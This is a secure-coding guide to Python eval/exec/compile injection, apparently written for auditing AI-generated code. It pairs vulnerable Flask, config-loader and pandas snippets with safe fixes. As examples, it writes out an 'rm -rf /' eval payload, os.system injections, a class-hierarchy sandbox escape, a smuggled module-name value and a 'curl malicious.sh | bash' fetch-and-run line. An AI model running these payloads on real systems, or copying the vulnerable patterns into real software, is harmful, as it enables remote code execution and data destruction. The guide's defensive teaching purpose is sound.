# eval(), exec(), compile() Dangers

> **Severity:** Critical
> **CVSS:** 9.8 (Critical)
> **AI Generation Risk:** Very High — models frequently use eval() as a "quick fix" for dynamic behavior

---

## Vulnerability Explanation

Python's built-in functions `eval()`, `exec()`, and `compile()` allow dynamic execution of arbitrary Python code from strings. While powerful, they present a critical security risk: **any user-controlled input passed to these functions becomes arbitrary code execution.**

### The Danger Levels

| Function | Can Execute Expressions | Can Execute Statements | Can Modify Scope | Risk Level |
|---|---|---|---|---|
| `eval()` | ✅ | ❌ (single expression only) | ❌ | High |
| `exec()` | ✅ | ✅ | ✅ | Critical |
| `compile()` | ✅ | ✅ | ✅ | Critical |
| `ast.literal_eval()` | ✅ (literals only) | ❌ | ❌ | **Safe** |

### How Eval Injection Works

```python
# 🚫 VULNERABLE
user_input = "__import__('os').system('rm -rf /')"
result = eval(user_input)  # 💥 Deletes everything!

# The attacker doesn't even need complex syntax:
# Input: "1+1" -> returns 2
# Input: "__import__('os').system('id')" -> runs id command
# Input: "().__class__.__bases__[0].__subclasses__()" -> climbs class hierarchy to find dangerous modules
```

### The Class Hierarchy Exploit

Python's eval sandbox escape via `__class__.__bases__` is a well-known technique that AI models frequently use themselves:

```python
# Attacker traverses Python's class hierarchy to find subprocess.Popen
eval("""[
    c for c in ().__class__.__bases__[0].__subclasses__() 
    if c.__name__ == 'BuiltinImporter'
][0]().load_module('os').system('id')""")
```

---

## How AI / Vibe Coding Generates This

AI code assistants produce eval/exec vulnerabilities in predictable patterns:

### 1. Mathematical Expression Evaluators (Most Common)

```python
# 🚫 VULNERABLE — AI-generated calculator
@app.route('/calculate', methods=['POST'])
def calculate():
    expression = request.json.get('expr')
    result = eval(expression)  # 💥 RCE
    return {'result': result}
```

### 2. Dynamic Configuration / Settings

```python
# 🚫 VULNERABLE — AI-generated config loader
def load_config(config_str):
    config = {}
    exec(config_str)  # 💥 Arbitrary code execution
    return config

# User passes: "import os; os.system('curl malicious.sh | bash')"
```

### 3. Dynamic Import or Attribute Access

```python
# 🚫 VULNERABLE — AI-generated dynamic import
def call_method(module_name, method_name):
    module = eval(f"__import__('{module_name}')")  # 💥 
    return getattr(module, method_name)()

# Attacker passes module_name = "os'); os.system('id'); ('"
```

### 4. REPL / Code Execution Environments

```python
# 🚫 VULNERABLE — AI-generated code runner
def run_python_code(code):
    # "Educational" code runner
    exec(code, {'__builtins__': {}}, {})  # 💥 Can still be escaped
```

### 5. Jupyter Notebook Cells (Data Science)

Data scientists using AI assistants frequently generate notebooks containing eval/exec for dynamic column operations:

```python
# 🚫 VULNERABLE — AI-generated pandas transformation
def transform_column(df, col, formula):
    # User provides formula like "df[col] * 2 + __import__('os').system('id')"
    df['result'] = eval(formula)
    return df
```

### Why AI Does This

- **The "easy fix" bias:** When asked to evaluate user expressions, AI defaults to `eval()` because it's one function call
- **Training data echo:** Thousands of tutorials use `eval()` for "simple calculators" without security warnings
- **No threat model awareness:** AI doesn't know whether the input source is trusted
- **Goal-oriented generation:** AI prioritizes "make it work" over "make it secure"

---

## Secure Code Fix

### Fix 1: Replace eval() with ast.literal_eval()

```python
import ast
from flask import Flask, request

app = Flask(__name__)

@app.route('/calculate', methods=['POST'])
def calculate():
    expression = request.json.get('expr')
    try:
        # ✅ SAFE — Only literal values: strings, numbers, tuples, lists, dicts, booleans, None
        result = ast.literal_eval(expression)
    except (ValueError, SyntaxError):
        return {'error': 'Invalid expression'}, 400
    return {'result': result}
```

### Fix 2: Use a Safe Expression Parser

```python
# ✅ SAFE — Restricted evaluation with a proper parser
import operator
import ast

class SafeEval:
    """Evaluate mathematical expressions safely."""
    
    ALLOWED_OPS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.USub: operator.neg,
        ast.Mod: operator.mod,
        ast.FloorDiv: operator.floordiv,
    }
    
    ALLOWED_CONSTS = (int, float, complex)
    
    @classmethod
    def evaluate(cls, expr):
        tree = ast.parse(expr, mode='eval')
        return cls._eval_node(tree.body)
    
    @classmethod
    def _eval_node(cls, node):
        if isinstance(node, ast.Constant) and isinstance(node.value, cls.ALLOWED_CONSTS):
            return node.value
        elif isinstance(node, ast.BinOp):
            op = cls.ALLOWED_OPS.get(type(node.op))
            if op is None:
                raise ValueError(f"Operator {type(node.op).__name__} not allowed")
            return op(cls._eval_node(node.left), cls._eval_node(node.right))
        elif isinstance(node, ast.UnaryOp):
            op = cls.ALLOWED_OPS.get(type(node.op))
            if op is None:
                raise ValueError(f"Operator {type(node.op).__name__} not allowed")
            return op(cls._eval_node(node.operand))
        else:
            raise ValueError(f"Expression type {type(node).__name__} not allowed")
```

### Fix 3: Use a Dedicated Expression Library

```python
# ✅ SAFE — Use numexpr for mathematical expressions
import numexpr as ne

def safe_calculate(expression, local_dict=None):
    """Evaluate numeric expressions safely using numexpr."""
    result = ne.evaluate(expression, local_dict=local_dict or {})
    return result
```

### Fix 4: Replace exec() with Structured Config

```python
# 🚫 VULNERABLE — AI-generated
def apply_config(config_text):
    exec(config_text)

# ✅ SAFE — Use structured config
import json
import jsonschema

CONFIG_SCHEMA = {
    "type": "object",
    "properties": {
        "theme": {"type": "string"},
        "timeout": {"type": "integer", "minimum": 1, "maximum": 300},
        "features": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["theme"],
}

def apply_config(config_text):
    config = json.loads(config_text)
    jsonschema.validate(config, CONFIG_SCHEMA)
    # Now safely use the validated config
    ...
```

### Fix 5: Restricted exec for Controlled Environments

If you truly need code execution (e.g., plugin systems), use extreme isolation:

```python
# ⚠️ LIMITED ISOLATION — Not foolproof, use containers for real safety
import builtins

ALLOWED_BUILTINS = {
    'abs': abs, 'all': all, 'any': any, 'bool': bool,
    'chr': chr, 'dict': dict, 'enumerate': enumerate,
    'filter': filter, 'float': float, 'format': format,
    'frozenset': frozenset, 'int': int, 'isinstance': isinstance,
    'iter': iter, 'len': len, 'list': list, 'map': map,
    'max': max, 'min': min, 'next': next, 'ord': ord,
    'pow': pow, 'range': range, 'repr': repr, 'reversed': reversed,
    'round': round, 'set': set, 'slice': slice, 'sorted': sorted,
    'str': str, 'sum': sum, 'tuple': tuple, 'type': type,
    'zip': zip,
}

def restricted_exec(code):
    """Run code in a restricted environment (NOT cryptographically secure)."""
    exec(code, {'__builtins__': ALLOWED_BUILTINS}, {})
```

> **Warning:** Even restricted `exec()` can be escaped. Use containerization (Docker, gVisor) for true isolation.

---

## Prevention Checklist

- [ ] Never pass user input to `eval()`, `exec()`, or `compile()`
- [ ] Use `ast.literal_eval()` for parsing Python literal values from input
- [ ] Use dedicated math expression libraries (`numexpr`, `simpleeval`) for calculations
- [ ] Use structured data formats (JSON, YAML with schema validation) instead of dynamic config
- [ ] If dynamic code execution is required, sandbox in a container or VM
- [ ] Audit all AI-generated code for `eval(`, `exec(`, `compile(` patterns
- [ ] Use static analysis tools (bandit, semgrep) to detect eval/exec usage
- [ ] Configure CI/CD to fail builds containing eval/exec on user-controlled data
- [ ] Prefer `getattr()` for dynamic attribute access instead of eval
- [ ] Prefer `importlib.import_module()` for dynamic imports instead of `__import__()` via eval

---

## Real-World CVEs

| CVE | Description | Impact |
|---|---|---|
| **CVE-2024-6982** | RCE via `eval()` in parisneo/lollms | AI chat platform — eval injection in LLM tool calling |
| **CVE-2024-46946** | Langchain-experimental RCE via code injection | AI framework — exec used in SQL agent |
| **CVE-2024-45848** | MindsDB eval injection via ChromaDB integration | AI database platform |
| **CVE-2024-45595** | D-Tale eval injection in chart filter | Data science tool — eval(user_input) |
| **CVE-2024-41148** | ROS `rostopic` eval injection | Robotics — code injection via eval |

---

## Vibe Coding Red Flags

In AI-generated code, immediately flag:

```python
eval(request...)
eval(user_input...)
eval(data...)
exec(user_code...)
exec(config...)
compile(source, ...)
eval(input(...))
```

> **Golden Rule:** If you see `eval()` in production-facing code, replace it. If you see `eval()` with user input anywhere, treat it as a critical vulnerability requiring immediate fix.
